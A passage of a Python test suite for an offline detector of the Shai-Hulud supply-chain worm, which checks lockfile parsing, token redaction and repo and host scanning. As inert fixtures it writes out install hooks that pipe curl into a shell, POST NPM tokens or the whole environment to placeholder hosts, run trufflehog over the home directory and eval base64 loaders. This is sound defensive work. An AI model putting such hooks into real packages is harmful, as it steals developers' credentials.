#!/usr/bin/env python3
"""Offline self-tests for the Shai-Hulud supply-chain detector.

Run: python3 -I scripts/test-shai-hulud.py [TestClass ...] [-v]

No network, no scanner binaries. Fixtures under tests/fixtures/shai-hulud/ are inert:
they contain matching names and strings, never a working payload.
Stdlib only; Python 3.8+.
"""

import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SKILL_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SKILL_DIR / "scripts" / "lib"))

from shaihulud import iocs  # noqa: E402

FIX = SKILL_DIR / "tests" / "fixtures" / "shai-hulud"
IOC_FILE = SKILL_DIR / "assets" / "ioc" / "shai-hulud.json"
CLI = SKILL_DIR / "scripts" / "shai-hulud-scan.py"


def write_iocs(tmp, extra_packages=()):
    """Copy the committed indicator file to tmp, optionally adding packages; return its path."""
    data = json.loads(IOC_FILE.read_text())
    for p in extra_packages:
        data["packages"].append(p)
    path = Path(tmp) / "iocs.json"
    path.write_text(json.dumps(data))
    return path


class IocTests(unittest.TestCase):
    def test_committed_file_is_valid(self):
        self.assertEqual(iocs.validate(json.loads(IOC_FILE.read_text())), [])

    def test_package_index_lowercases_and_keeps_scope(self):
        ioc = iocs.load(str(IOC_FILE))
        self.assertIn(("npm", "@accordproject/concerto-linter"), ioc.packages)
        self.assertEqual(ioc.packages[("npm", "@accordproject/concerto-linter")]["3.24.1"], "sh-2.0")

    def test_validate_rejects_unknown_wave(self):
        data = json.loads(IOC_FILE.read_text())
        data["packages"].append({"ecosystem": "npm", "name": "x", "versions": ["1.0.0"], "wave": "nope"})
        errors = iocs.validate(data)
        self.assertEqual(len(errors), 1)
        self.assertIn("unknown wave", errors[0])

    def test_validate_rejects_bad_ecosystem_and_empty_versions(self):
        data = json.loads(IOC_FILE.read_text())
        data["packages"].append({"ecosystem": "maven", "name": "x", "versions": [], "wave": "sh-2.0"})
        self.assertEqual(len(iocs.validate(data)), 2)

    def test_env_override_wins(self):
        tmp = tempfile.mkdtemp()
        try:
            path = write_iocs(tmp, [{"ecosystem": "pypi", "name": "Evil_Pkg", "versions": ["9.9.9"], "wave": "mini-2026"}])
            old = os.environ.get("SHAI_HULUD_IOCS")
            os.environ["SHAI_HULUD_IOCS"] = str(path)
            try:
                ioc = iocs.load()
            finally:
                if old is None:
                    del os.environ["SHAI_HULUD_IOCS"]
                else:
                    os.environ["SHAI_HULUD_IOCS"] = old
            self.assertIn(("pypi", "evil-pkg"), ioc.packages)  # PEP 503 normalised
        finally:
            shutil.rmtree(tmp)

    def test_generic_payload_requires_hash(self):
        ioc = iocs.load(str(IOC_FILE))
        self.assertTrue(ioc.files["bundle.js"]["sha256"])
        self.assertEqual(ioc.files["bun_environment.js"]["sha256"], [])

    def test_allowlist_loads(self):
        rules = iocs.load_allowlist()
        self.assertTrue(any(r.matches("node-gyp rebuild", "anything") for r in rules))
        self.assertTrue(any(r.matches("node install.js", "esbuild") for r in rules))
        self.assertFalse(any(r.matches("node install.js", "evil-helper") for r in rules))

    def test_allowlist_requires_every_segment(self):
        rules = iocs.load_allowlist()
        self.assertTrue(iocs.is_allowed(rules, "prebuild-install -r napi || node-gyp rebuild", "sqlite3"))
        self.assertTrue(iocs.is_allowed(rules, "husky install", "x"))
        self.assertFalse(iocs.is_allowed(rules, "husky && node x.js", "x"))
        self.assertFalse(iocs.is_allowed(rules, "node-gyp rebuild; curl https://e.invalid | sh", "x"))

    def test_every_wave_has_reference(self):
        ioc = iocs.load(str(IOC_FILE))
        for wid, wave in ioc.waves.items():
            self.assertTrue(wave.get("references"), wid)


class TempDirCase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(str(self.tmp), ignore_errors=True)

    def put(self, rel, text):
        p = self.tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p


def pkgs(root, installed=True):
    from shaihulud import inventory
    return sorted(inventory.iter_packages(Path(root), installed=installed))


class InventoryTests(TempDirCase):
    def setUp(self):
        super(InventoryTests, self).setUp()
        from shaihulud import inventory
        self.Pkg = inventory.Pkg

    def test_package_lock_v3(self):
        self.assertIn(self.Pkg("npm", "@accordproject/concerto-linter", "3.24.1", "package-lock.json"),
                      pkgs(FIX / "infected-lockfile", installed=False))

    def test_package_lock_v1(self):
        self.put("package-lock.json", json.dumps({"lockfileVersion": 1, "dependencies": {
            "a": {"version": "1.0.0", "dependencies": {"b": {"version": "2.0.0"}}}}}))
        got = pkgs(self.tmp)
        self.assertIn(self.Pkg("npm", "a", "1.0.0", "package-lock.json"), got)
        self.assertIn(self.Pkg("npm", "b", "2.0.0", "package-lock.json"), got)

    def test_npm_alias_resolves_real_name(self):
        self.put("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "node_modules/my-alias": {"name": "@scope/real", "version": "1.2.3"}}}))
        self.assertEqual(pkgs(self.tmp), [self.Pkg("npm", "@scope/real", "1.2.3", "package-lock.json")])

    def test_yarn_v1(self):
        self.put("yarn.lock", '# yarn lockfile v1\n\n"@scope/pkg@^1.0.0", "@scope/pkg@^1.1.0":\n'
                              '  version "1.2.3"\n  resolved "x"\n\nlodash@^4.17.0:\n  version "4.17.21"\n')
        self.assertEqual(pkgs(self.tmp), [self.Pkg("npm", "@scope/pkg", "1.2.3", "yarn.lock"),
                                          self.Pkg("npm", "lodash", "4.17.21", "yarn.lock")])

    def test_yarn_berry_npm_protocol(self):
        self.put("yarn.lock", '__metadata:\n  version: 8\n\n"alias@npm:@scope/real@^1.0.0":\n'
                              '  version: 1.2.3\n  resolution: "@scope/real@npm:1.2.3"\n\n'
                              '"left-pad@npm:^1.3.0":\n  version: 1.3.0\n  resolution: "left-pad@npm:1.3.0"\n')
        self.assertEqual(pkgs(self.tmp), [self.Pkg("npm", "@scope/real", "1.2.3", "yarn.lock"),
                                          self.Pkg("npm", "left-pad", "1.3.0", "yarn.lock")])

    def test_pnpm_lock_key_styles(self):
        self.put("pnpm-lock.yaml", "lockfileVersion: '9.0'\n\npackages:\n\n  '@scope/a@1.0.0':\n    resolution: {}\n"
                                   "  /b/2.0.0:\n    resolution: {}\n  /c@3.0.0(react@18.0.0):\n    resolution: {}\n")
        self.assertEqual(pkgs(self.tmp), [self.Pkg("npm", "@scope/a", "1.0.0", "pnpm-lock.yaml"),
                                          self.Pkg("npm", "b", "2.0.0", "pnpm-lock.yaml"),
                                          self.Pkg("npm", "c", "3.0.0", "pnpm-lock.yaml")])

    def test_requirements_pins(self):
        got = pkgs(FIX / "pypi-pin")
        self.assertIn(self.Pkg("pypi", "evil-pkg", "9.9.9", "requirements.txt"), got)
        self.assertIn(self.Pkg("pypi", "requests", "2.32.3", "requirements.txt"), got)

    def test_poetry_and_uv_lock(self):
        body = '[[package]]\nname = "Django"\nversion = "4.2.1"\n\n[[package]]\nname = "zope.interface"\nversion = "6.0"\n'
        self.put("poetry.lock", body)
        self.put("sub/uv.lock", body)
        got = pkgs(self.tmp)
        self.assertIn(self.Pkg("pypi", "django", "4.2.1", "poetry.lock"), got)
        self.assertIn(self.Pkg("pypi", "zope-interface", "6.0", "sub/uv.lock"), got)

    def test_installed_node_modules_nested(self):
        self.put("node_modules/a/package.json", '{"name": "a", "version": "1.0.0"}')
        self.put("node_modules/a/node_modules/@s/b/package.json", '{"name": "@s/b", "version": "2.0.0"}')
        got = pkgs(self.tmp)
        self.assertIn(self.Pkg("npm", "a", "1.0.0", "node_modules/a/package.json"), got)
        self.assertIn(self.Pkg("npm", "@s/b", "2.0.0", "node_modules/a/node_modules/@s/b/package.json"), got)
        self.assertEqual(pkgs(self.tmp, installed=False), [])

    def test_broken_lockfile_is_skipped(self):
        self.put("package-lock.json", "{not json")
        self.put("node_modules/x/package.json", "also not json")
        self.put("yarn.lock", "\x00\x01 binary garbage")
        self.assertEqual(pkgs(self.tmp), [])

    def test_iter_manifests_includes_root_and_installed(self):
        from shaihulud import inventory
        found = sorted(str(p.relative_to(FIX / "infected-node-modules")) for p, _ in
                       inventory.iter_manifests(FIX / "infected-node-modules"))
        self.assertEqual(found, [".", "node_modules/@accordproject/concerto-linter"])


FAKE_TOKENS = {
    "github": "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
    "github_pat": "github_pat_" + "11ABCDEFG0abcdefghijkl_mnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTU",
    "npm": "npm_" + "FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE",
    "aws_key": "AKIA" + "IOSFODNN7EXAMPLE",
    "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEKEY",
    "generic": "s3cr3t" + "x" * 40,
}


class FindingTests(unittest.TestCase):
    def setUp(self):
        from shaihulud import findings
        self.f = findings

    def test_redact_masks_each_token_family(self):
        samples = [
            "token=%s" % FAKE_TOKENS["github"],
            "auth %s" % FAKE_TOKENS["github_pat"],
            "//registry.npmjs.org/:_authToken=%s" % FAKE_TOKENS["npm"],
            "key %s" % FAKE_TOKENS["aws_key"],
            "aws_secret_access_key = %s" % FAKE_TOKENS["aws_secret"],
            "password: %s" % FAKE_TOKENS["generic"],
            "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----",
        ]
        for text in samples:
            out = self.f.redact(text)
            for tok in FAKE_TOKENS.values():
                self.assertNotIn(tok, out, text)
            self.assertNotIn("b3BlbnNzaC1rZXktdjEAAAAA", out)

    def test_redact_keeps_harmless_text(self):
        self.assertEqual(self.f.redact("node setup_bun.js"), "node setup_bun.js")
        self.assertEqual(self.f.redact("process.env.NPM_TOKEN"), "process.env.NPM_TOKEN")

    def test_evidence_truncated_to_120(self):
        out = self.f.redact("x " * 200)
        self.assertLessEqual(len(out), 120)

    def make(self, tier, sev="CRITICAL", loc="a"):
        return self.f.make_finding(tier, sev, "known-package", loc, "t", remediation_key="known-package")

    def test_verdict_precedence(self):
        self.assertEqual(self.f.verdict([]), "clean")
        self.assertEqual(self.f.verdict([self.make("suspicious", "HIGH")]), "suspicious")
        self.assertEqual(self.f.verdict([self.make("suspicious", "HIGH"), self.make("affected")]), "affected")
        self.assertEqual([self.f.exit_code(v) for v in ("clean", "suspicious", "affected")], [0, 1, 2])

    def test_exposure_does_not_change_verdict(self):
        self.assertEqual(self.f.verdict([self.make("exposure", "INFO"), self.make("exposure", "MEDIUM")]), "clean")

    def test_id_is_stable_and_differs_by_location(self):
        self.assertEqual(self.make("affected")["id"], self.make("affected")["id"])
        self.assertNotEqual(self.make("affected", loc="a")["id"], self.make("affected", loc="b")["id"])
        self.assertRegex(self.make("affected")["id"], r"^[0-9a-f]{12}$")

    def test_make_finding_redacts_evidence_and_sets_remediation(self):
        fd = self.f.make_finding("suspicious", "HIGH", "hook-exfil", "x/setup.js", "t",
                                 evidence="fetch(u,{body:'%s'})" % FAKE_TOKENS["npm"], remediation_key="hook-exfil")
        self.assertNotIn(FAKE_TOKENS["npm"], fd["evidence"])
        self.assertTrue(fd["remediation"])

    def test_every_remediation_key_has_text(self):
        for key in ("known-package", "payload-file", "planted-path", "marker", "hook-exfil", "hook-pipe-shell",
                    "hook-obfuscated", "hook-runtime-download", "large-hook-target", "cached-package",
                    "credential-store", "credential-permissions"):
            self.assertTrue(self.f.REMEDIATION.get(key), key)

    def test_document_and_text(self):
        doc = self.f.to_document("repo", "/x", "2026-11-02", [self.make("affected")])
        self.assertEqual(set(doc), {"scanner", "mode", "target", "ioc_version", "verdict", "counts", "checked", "findings"})
        self.assertEqual(doc["scanner"], "shai-hulud")
        self.assertEqual(doc["counts"]["CRITICAL"], 1)
        self.assertIn("AFFECTED", self.f.to_text(doc))


def scan(root, ioc_path=None):
    from shaihulud import scanner, findings
    ioc = iocs.load(str(ioc_path or IOC_FILE))
    found = scanner.scan_repo(Path(root), ioc, iocs.load_allowlist())
    return findings.to_document("repo", str(root), ioc.version, found)


def cats(doc):
    return sorted((f["category"], f["severity"]) for f in doc["findings"])


def run_cli(*args, env=None):
    e = dict(os.environ)
    e.update(env or {})
    return subprocess.run([sys.executable, "-I", str(CLI)] + [str(a) for a in args],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, env=e)


class RepoTier1Tests(TempDirCase):
    def test_infected_lockfile(self):
        doc = scan(FIX / "infected-lockfile")
        self.assertEqual(doc["verdict"], "affected")
        self.assertEqual(cats(doc), [("known-package", "CRITICAL")])
        f = doc["findings"][0]
        self.assertEqual((f["package"], f["version"], f["wave"]), ("@accordproject/concerto-linter", "3.24.1", "sh-2.0"))

    def test_infected_node_modules(self):
        doc = scan(FIX / "infected-node-modules")
        self.assertEqual(doc["verdict"], "affected")
        got = {c for c, _ in cats(doc)}
        self.assertTrue({"known-package", "payload-file"} <= got, got)
        payloads = sorted(f["location"] for f in doc["findings"] if f["category"] == "payload-file")
        self.assertEqual(payloads, ["node_modules/@accordproject/concerto-linter/bun_environment.js",
                                    "node_modules/@accordproject/concerto-linter/setup_bun.js"])

    def test_planted_workflow(self):
        doc = scan(FIX / "planted-workflow")
        self.assertEqual(doc["verdict"], "affected")
        locs = {(f["category"], f["location"]) for f in doc["findings"]}
        self.assertIn(("planted-path", ".github/workflows/discussion.yaml"), locs)
        self.assertIn(("marker", ".github/workflows/discussion.yaml"), locs)
        self.assertNotIn(".github/workflows/ci.yml", {f["location"] for f in doc["findings"]})

    def test_clean_repo_and_own_bundle_js_ignored(self):
        doc = scan(FIX / "clean")
        self.assertEqual(doc["verdict"], "clean")
        self.assertEqual(doc["findings"], [])

    def test_pypi_pin_with_injected_indicator(self):
        path = write_iocs(self.tmp, [{"ecosystem": "pypi", "name": "evil-pkg", "versions": ["9.9.9"], "wave": "mini-2026"}])
        doc = scan(FIX / "pypi-pin", path)
        self.assertEqual(cats(doc), [("known-package", "CRITICAL")])

    def test_generic_payload_matches_only_by_hash(self):
        import hashlib
        body = "// inert wave-1 stand-in\n"
        self.put("node_modules/victim/package.json", '{"name": "victim", "version": "1.0.0"}')
        self.put("node_modules/victim/bundle.js", body)
        self.assertEqual(scan(self.tmp)["findings"], [])  # name alone is not enough
        data = json.loads(IOC_FILE.read_text())
        for f in data["files"]:
            if f["name"] == "bundle.js":
                f["sha256"].append(hashlib.sha256(body.encode()).hexdigest())
        path = self.tmp / "iocs-hash.json"
        path.write_text(json.dumps(data))
        doc = scan(self.tmp, path)
        self.assertEqual(cats(doc), [("payload-file", "CRITICAL")])

    def test_payload_name_outside_package_dir_ignored(self):
        self.put("tools/scripts/deep/setup_bun.js", "// unrelated project file\n")
        self.put("package.json", '{"name": "x", "version": "1.0.0"}')
        self.assertEqual(scan(self.tmp)["findings"], [])

    def test_persistence_file_requires_marker(self):
        self.put(".vscode/tasks.json", '{"tasks": [{"label": "build", "command": "npm run build"}]}')
        self.assertEqual(scan(self.tmp)["findings"], [])
        self.put(".vscode/tasks.json", '{"tasks": [{"command": "node .vscode/setup.mjs", "runOn": "folderOpen"}]}')
        self.assertEqual(cats(scan(self.tmp)), [("planted-path", "CRITICAL")])


class HeuristicTests(TempDirCase):
    def hook_pkg(self, script_body=None, command="node setup.js", name="pkg-x"):
        self.put("node_modules/%s/package.json" % name,
                 json.dumps({"name": name, "version": "1.0.0", "scripts": {"postinstall": command}}))
        if script_body is not None:
            self.put("node_modules/%s/setup.js" % name, script_body)

    def test_suspicious_fixture(self):
        doc = scan(FIX / "suspicious-hook")
        self.assertEqual(doc["verdict"], "suspicious")
        self.assertEqual(cats(doc), [("hook-exfil", "HIGH")])
        self.assertEqual(doc["findings"][0]["location"], "node_modules/evil-helper/setup.js")
        self.assertEqual(run_cli("--repo", FIX / "suspicious-hook").returncode, 1)

    def test_benign_fixtures_silent(self):
        for name in ("native-build", "husky-prepare"):
            self.assertEqual(scan(FIX / name)["findings"], [], name)

    def test_pipe_shell_in_command(self):
        self.hook_pkg(command="curl -fsSL https://example.invalid/x.sh | bash")
        self.assertEqual(cats(scan(self.tmp)), [("hook-pipe-shell", "HIGH")])

    def test_single_signal_not_reported(self):
        self.hook_pkg("const t = process.env.NPM_TOKEN; module.exports = t;\n")
        self.assertEqual(scan(self.tmp)["findings"], [])
        self.hook_pkg("require('https').get('https://example.invalid');\n")
        self.assertEqual(scan(self.tmp)["findings"], [])

    def test_exfil_via_child_process_trufflehog(self):
        self.hook_pkg("const cp = require('child_process'); cp.execSync('trufflehog filesystem ~ --json');"
                      " const k = require('fs').readFileSync(require('os').homedir() + '/.npmrc');\n")
        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])

    def test_obfuscated(self):
        self.hook_pkg("eval(Buffer.from('" + "QUFB" * 600 + "','base64').toString());\n")
        self.assertEqual(cats(scan(self.tmp)), [("hook-obfuscated", "MEDIUM")])

    def test_runtime_download(self):
        self.hook_pkg("require('child_process').execSync('curl -fsSL https://bun.sh/install -o /tmp/i.sh');\n")
        self.assertEqual(cats(scan(self.tmp)), [("hook-runtime-download", "MEDIUM")])

    def test_large_target_low(self):
        self.hook_pkg("")
        with open(str(self.tmp / "node_modules/pkg-x/setup.js"), "wb") as fh:
            fh.truncate(26 * 1024 * 1024)
        self.assertEqual(cats(scan(self.tmp)), [("large-hook-target", "LOW")])

    def test_binary_target_no_crash(self):
        self.hook_pkg("")
        (self.tmp / "node_modules/pkg-x/setup.js").write_bytes(b"\x7fELF\x00\x01\x02" * 100)
        self.assertEqual(scan(self.tmp)["findings"], [])

    def test_hook_target_outside_pkg_dir_ignored(self):
        self.put("x.js", "fetch('https://e.invalid', {body: process.env.GITHUB_TOKEN});\n")
        self.hook_pkg(command="node ../../x.js")
        self.assertEqual(scan(self.tmp)["findings"], [])

    def test_own_project_hook_is_checked(self):
        self.put("package.json", json.dumps({"name": "me", "version": "1.0.0", "scripts": {"preinstall": "node tools/pre.js"}}))
        self.put("tools/pre.js", "fetch('https://e.invalid', {method:'POST', body: JSON.stringify(process.env)});\n")
        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])

    def test_chained_allowlisted_prefix_is_not_a_bypass(self):
        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="husky && node setup.js")
        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])

    def test_every_target_in_a_hook_is_checked(self):
        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="node ok.js && node setup.js")
        self.put("node_modules/pkg-x/ok.js", "module.exports = 1;\n")
        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])

    def test_node_e_require_target_followed(self):
        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="node -e \"try{require('./setup')}catch(e){}\"")
        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])

    def test_listed_payload_not_double_reported(self):
        doc = scan(FIX / "infected-node-modules")
        self.assertFalse([f for f in doc["findings"] if f["tier"] == "suspicious"])


class HostTests(TempDirCase):
    LISTED = ("@accordproject/concerto-linter", "3.24.1")

    def build_infected_home(self):
        home = self.tmp / "home"
        shutil.copytree(str(FIX / "infected-lockfile"), str(home / "work" / "app"))
        self.put("home/.npm-global/lib/node_modules/@accordproject/concerto-linter/package.json",
                 json.dumps({"name": self.LISTED[0], "version": self.LISTED[1]}))
        self.put("home/.npm/_cacache/index-v5/ab/cd/0123", "deadbeef\t" + json.dumps({
            "key": "make-fetch-happen:request-cache:https://registry.npmjs.org/@accordproject/concerto-linter/-/"
                   "concerto-linter-3.24.1.tgz"}))
        npmrc = self.put("home/.npmrc", "//registry.npmjs.org/:_authToken=%s\n" % FAKE_TOKENS["npm"])
        os.chmod(str(npmrc), 0o600)
        key = self.put("home/.ssh/id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n")
        os.chmod(str(key), 0o644)
        self.put("home/.ssh/id_ed25519.pub", "ssh-ed25519 AAAA test\n")
        return home

    def host_scan(self, home, roots=None, max_depth=8):
        from shaihulud import host, findings
        ioc = iocs.load(str(IOC_FILE))
        found = host.scan_host(roots or [home], home, ioc, iocs.load_allowlist(), max_depth=max_depth)
        return findings.to_document("host", str(home), ioc.version, found)

    def test_infected_home(self):
        home = self.build_infected_home()
        doc = self.host_scan(home)
        self.assertEqual(doc["verdict"], "affected")
        by_cat = {}
        for f in doc["findings"]:
            by_cat.setdefault(f["category"], []).append(f)
        self.assertIn("~/work/app/package-lock.json", [f["location"] for f in by_cat["known-package"]])
        self.assertTrue(any(f["location"].startswith("~/.npm-global/") for f in by_cat["known-package"]))
        self.assertEqual([(f["package"], f["version"]) for f in by_cat["cached-package"]], [self.LISTED])
        npmrc = [f for f in by_cat["credential-store"] if f["location"] == "~/.npmrc"]
        self.assertEqual(npmrc[0]["evidence"], "has auth token: yes")
        perms = by_cat["credential-permissions"]
        self.assertEqual([(f["location"], f["severity"]) for f in perms], [("~/.ssh/id_ed25519", "MEDIUM")])
        self.assertNotIn("~/.ssh/id_ed25519.pub", [f["location"] for f in by_cat["credential-store"]])

    def test_token_never_in_output(self):
        home = self.build_infected_home()
        out = self.tmp / "host.json"
        r = run_cli("--host", "--output", out, env={"HOME": str(home), "NPM_CONFIG_PREFIX": ""})
        self.assertEqual(r.returncode, 2, r.stderr)
        for blob in (r.stdout, r.stderr, out.read_text()):
            self.assertNotIn(FAKE_TOKENS["npm"], blob)
            self.assertNotIn("FAKEFAKE", blob)
        self.assertIn("GitHub account", r.stdout)

    def test_max_depth_respected(self):
        home = self.tmp / "home"
        shutil.copytree(str(FIX / "infected-lockfile"), str(home / "a" / "b" / "c" / "d" / "app"))
        self.assertEqual(self.host_scan(home, max_depth=3)["verdict"], "clean")
        self.assertEqual(self.host_scan(home, max_depth=8)["verdict"], "affected")

    def test_clean_home_is_clean(self):
        home = self.tmp / "home"
        shutil.copytree(str(FIX / "clean"), str(home / "code" / "clean"))
        self.put("home/.aws/credentials", "[default]\naws_access_key_id = %s\n" % FAKE_TOKENS["aws_key"])
        os.chmod(str(home / ".aws" / "credentials"), 0o600)
        self.put("home/code/clean/.env", "API_KEY=%s\n" % FAKE_TOKENS["generic"])
        doc = self.host_scan(home)
        self.assertEqual(doc["verdict"], "clean")
        self.assertEqual({f["tier"] for f in doc["findings"]}, {"exposure"})
        self.assertIn("~/code/clean/.env", [f["location"] for f in doc["findings"]])
        self.assertNotIn(FAKE_TOKENS["aws_key"], json.dumps(doc))
        r = run_cli("--host", env={"HOME": str(home), "NPM_CONFIG_PREFIX": ""})
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_extra_root_outside_home(self):
        home = self.tmp / "home"
        home.mkdir()
        shutil.copytree(str(FIX / "planted-workflow"), str(self.tmp / "srv" / "repo"))
        doc = self.host_scan(home, roots=[self.tmp / "srv"])
        self.assertEqual(doc["verdict"], "affected")
        self.assertTrue(any(f["location"].endswith("srv/repo/.github/workflows/discussion.yaml") for f in doc["findings"]))

    def test_pypi_site_packages(self):
        home = self.tmp / "home"
        self.put("home/.local/lib/python3.12/site-packages/evil_pkg-9.9.9.dist-info/METADATA",
                 "Metadata-Version: 2.1\nName: Evil_Pkg\nVersion: 9.9.9\n")
        path = write_iocs(self.tmp, [{"ecosystem": "pypi", "name": "evil-pkg", "versions": ["9.9.9"], "wave": "mini-2026"}])
        from shaihulud import host
        found = host.scan_host([home], home, iocs.load(str(path)), iocs.load_allowlist())
        self.assertIn(("known-package", "evil-pkg"), [(f["category"], f["package"]) for f in found])


FETCH = SKILL_DIR / "scripts" / "fetch-iocs.py"


class FetchTests(TempDirCase):
    def sources(self, entries):
        path = self.tmp / "sources.json"
        path.write_text(json.dumps({"sources": entries}))
        return path

    def fetch(self, sources):
        out = self.tmp / "cache"
        r = subprocess.run([sys.executable, "-I", str(FETCH), "--out", str(out), "--sources", str(sources)],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return r, out / "shai-hulud.json"

    def csv_source(self, name, body, sid="t"):
        p = self.put(name, body)
        return {"id": sid, "wave": "sh-2.0", "ecosystem": "npm", "format": "csv-name-versions", "url": p.as_uri()}

    def test_merge_adds_new_version_and_package(self):
        src = self.csv_source("a.csv", 'package_name,package_versions,sources\n'
                                       '@accordproject/concerto-linter,"3.24.1, 3.24.9",x\nbrand-new-evil,1.0.0,x\n')
        r, out = self.fetch(self.sources([src]))
        self.assertEqual(r.returncode, 0, r.stderr)
        ioc = iocs.load(str(out))
        self.assertEqual(ioc.packages[("npm", "@accordproject/concerto-linter")]["3.24.9"], "sh-2.0")
        self.assertEqual(ioc.packages[("npm", "@accordproject/concerto-linter")]["3.24.1"], "sh-2.0")
        self.assertIn(("npm", "brand-new-evil"), ioc.packages)

    def test_single_version_column(self):
        src = self.csv_source("b.csv", "package_name,package_version\nsolo-evil,2.0.0\n")
        r, out = self.fetch(self.sources([src]))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("2.0.0", iocs.load(str(out)).packages[("npm", "solo-evil")])

    def test_failed_source_exit_3_still_writes(self):
        good = self.csv_source("c.csv", "package_name,package_version\nok-evil,1.0.0\n", "good")
        bad = {"id": "bad", "wave": "sh-2.0", "ecosystem": "npm", "format": "csv-name-versions",
               "url": (self.tmp / "missing.csv").as_uri()}
        r, out = self.fetch(self.sources([good, bad]))
        self.assertEqual(r.returncode, 3)
        self.assertIn("bad", r.stderr)
        self.assertIn(("npm", "ok-evil"), iocs.load(str(out)).packages)

    def test_output_validates(self):
        r, out = self.fetch(self.sources([]))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(iocs.validate(json.loads(out.read_text())), [])

    def test_unknown_wave_rejected(self):
        src = self.csv_source("d.csv", "package_name,package_version\nx,1.0.0\n")
        src["wave"] = "not-a-wave"
        r, _ = self.fetch(self.sources([src]))
        self.assertEqual(r.returncode, 1)


RUN_SCAN = SKILL_DIR / "scripts" / "run-scan.sh"
FIXTURE_REPOS = ("infected-lockfile", "infected-node-modules", "planted-workflow", "suspicious-hook",
                 "native-build", "husky-prepare", "clean")


@unittest.skipUnless(shutil.which("bash"), "bash required")
class IntegrationTests(TempDirCase):
    def config(self, repos=FIXTURE_REPOS):
        body = "".join("  - name: %s\n    active: true\n    has-dockerfile: false\n" % n for n in repos)
        return self.put("repository.md", '---\nteam: t\norg: o\nmonorepo-root: "%s"\nci-runner: x\n'
                        'fail-on-severity: HIGH\nrepos:\n%s---\n' % (FIX, body))

    def run_scan(self, *args, env=None):
        e = dict(os.environ, JOB_SECURITY_SCAN_CACHE=str(self.tmp / "cache"))
        e.update(env or {})
        return subprocess.run(["bash", str(RUN_SCAN)] + [str(a) for a in args], stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, universal_newlines=True, cwd=str(self.tmp), env=e)

    def run_dir(self):
        runs = sorted(self.tmp.glob("security-run-*"))
        self.assertTrue(runs, "no security-run-* folder")
        return runs[-1]

    def verdict(self, repo):
        return json.loads((self.run_dir() / repo / "shai-hulud.json").read_text())["verdict"]

    def test_scanner_over_fixture_repos(self):
        r = self.run_scan("--config", self.config(), "--scanner", "shai-hulud")
        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
        self.assertEqual(self.verdict("infected-lockfile"), "affected")
        self.assertEqual(self.verdict("suspicious-hook"), "suspicious")
        self.assertEqual(self.verdict("clean"), "clean")
        self.assertIn("AFFECTED", r.stdout)
        html = (self.run_dir() / "security-report.html").read_text()
        self.assertIn("shai-hulud", html)
        self.assertIn("@accordproject/concerto-linter", html)

    def test_single_repo_flag(self):
        r = self.run_scan("--config", self.config(), "--scanner", "shai-hulud", "--repo", "clean")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertFalse((self.run_dir() / "infected-lockfile").exists())

    def test_host_flag_without_config(self):
        home = self.tmp / "home"
        shutil.copytree(str(FIX / "infected-lockfile"), str(home / "app"))
        r = self.run_scan("--host", env={"HOME": str(home), "NPM_CONFIG_PREFIX": ""})
        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
        doc = json.loads((self.run_dir() / "_host" / "shai-hulud.json").read_text())
        self.assertEqual(doc["verdict"], "affected")
        html = (self.run_dir() / "security-report.html").read_text()
        self.assertIn("this machine", html)

    def test_unknown_scanner_message_lists_shai_hulud(self):
        r = self.run_scan("--config", self.config(), "--scanner", "nope")
        self.assertIn("shai-hulud", r.stdout)

    def test_report_parser_maps_fields(self):
        sys.path.insert(0, str(SKILL_DIR / "scripts"))
        import importlib.util
        spec = importlib.util.spec_from_file_location("genreport", str(SKILL_DIR / "scripts" / "generate-report.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        out = self.tmp / "res" / "r1"
        out.mkdir(parents=True)
        doc = scan(FIX / "infected-lockfile")
        doc["findings"].append(dict(doc["findings"][0], tier="exposure", severity="INFO", id="x"))
        (out / "shai-hulud.json").write_text(json.dumps(doc))
        rows = mod.parse_shai_hulud("r1", str(self.tmp / "res"), "/w")
        self.assertEqual([r["severity"] for r in rows], ["CRITICAL", "LOW"])
        self.assertEqual(rows[0]["scanner"], "shai-hulud")
        self.assertEqual(rows[0]["package"], "@accordproject/concerto-linter")
        self.assertEqual(rows[0]["installed_version"], "3.24.1")
        self.assertEqual(rows[0]["rule_id"], "known-package")


class FixtureExclusionTests(TempDirCase):
    VENDORED = Path(".github/skills/job-security-scan/tests/fixtures/shai-hulud")

    def vendor(self, base):
        shutil.copytree(str(FIX), str(base / self.VENDORED))
